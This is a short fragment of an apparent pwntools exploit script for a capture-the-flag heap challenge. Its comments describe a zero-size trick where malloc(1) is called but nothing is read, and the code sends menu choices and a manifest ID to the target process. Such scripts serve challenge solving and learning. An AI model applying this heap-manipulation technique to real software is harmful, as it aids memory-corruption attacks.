...
# Allocate without overwriting!
# If size is 0, malloc(1) is called (from the logic in wideload: if di == 0, cmove $1, %edi).
# But item size * item count = 0, so read reads 0 bytes!
p.sendline(b'1')
p.recvuntil(b'Manifest ID (0-15): ')
p.sendline(b'2')
p.recvuntil(b'Item count: ')
